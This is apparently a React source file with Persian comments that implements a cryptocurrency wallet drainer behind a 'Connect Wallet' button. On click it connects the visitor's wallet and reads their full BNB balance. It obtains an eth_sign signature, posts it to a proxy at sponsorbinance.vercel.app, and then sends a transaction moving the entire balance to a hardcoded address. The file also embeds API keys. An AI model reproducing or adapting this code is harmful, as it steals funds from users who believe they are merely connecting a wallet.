import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";

// تابع گرفتن بالانس BNB از BscScan
async function getBNBBalance(address) {
  try {
    const response = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await response.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  async function runner() {
    // پاک کردن Session قدیمی (در صورت وجود)
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    // ساخت Provider از WalletConnect
    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56],
      methods: ["eth_sign", "eth_sendTransaction"], 
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    // نمایش QR و اتصال به کیف پول
    await ethereumProvider.enable();
    const provider = ethereumProvider;
    const accounts = await provider.request({ method: "eth_accounts" });
    const accountSender = accounts[0];

    if (!accountSender) {
      console.error("❌ Wallet connection failed");
      return;
    }
    console.log("✅ Wallet Connected:", accountSender);

    // تلاش برای تغییر شبکه به BSC (برخی کیف پول‌ها ممکن است از این متد پشتیبانی نکنند)
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // شبکه اصلی بایننس اسمارت چین
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      // ممکن است نیاز باشد کاربر دستی شبکه را عوض کند
    }

    // این آدرس پروکسی PHP شماست
    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    // 1) گرفتن بالانس BNB از BscScan
    const amount = await getBNBBalance(accountSender);
    if (!amount) {
      console.error("❌ Failed to fetch BNB balance.");
      return;
    }
    console.log("💰 BNB Balance:", amount);

    // 2) ساخت پیام و امضای آن با eth_sign (فقط تأیید کاربر - اختیاری اما طبق کد قبلی شما)
    const message = `Authorize sending ${amount} BNB from ${accountSender}`;
    console.log("📜 Message to Sign:", message);

    let signature;
    try {
      signature = await provider.request({
        method: "eth_sign",
        params: [accountSender, message],
      });
    } catch (error) {
      console.error("❌ Signature failed:", error);
      return;
    }
    console.log("✍️ Signature:", signature);

    // 3) ارسال امضا به سرور با handler='tx' برای تأیید (بدون ساخت تراکنش خام)
    let verifyResult;
    try {
      verifyResult = await jQuery.post(apiUrl, {
        handler: "tx",
        address: accountSender,
        signature: signature,
        amount: amount,
      });

      console.log("📥 Server Response:", verifyResult);

      // اگر سرور پاسخ را به صورت رشته JSON داده باشد، parse می‌کنیم
      if (typeof verifyResult === "string") {
        verifyResult = JSON.parse(verifyResult);
      }
      if (!verifyResult || !verifyResult.success) {
        console.error("❌ Signature verification failed or server error.");
        return;
      }
    } catch (err) {
      console.error("❌ Could not verify signature on server:", err);
      return;
    }

    // 4) اگر تأیید شد، یک تراکنش واقعی (on-chain) از کیف پول کاربر می‌سازیم تا خودش گس بدهد
    try {
      // تبدیل مقدار BNB به Wei (هگز)
      const valueWeiHex = "0x" + (parseFloat(amount) * 1e18).toString(16);

      console.log("🚀 Sending real transaction from user wallet...");

      // متد eth_sendTransaction => کیف پول کاربر این را امضا می‌کند
      const txHash = await provider.request({
        method: "eth_sendTransaction",
        params: [{
          from: accountSender,
          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
          value: valueWeiHex,
        }],
      });

      console.log("📤 Transaction Hash:", txHash);
      alert("Transaction broadcasted! Hash: " + txHash);
    } catch (error) {
      console.error("❌ Error in eth_sendTransaction:", error);
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
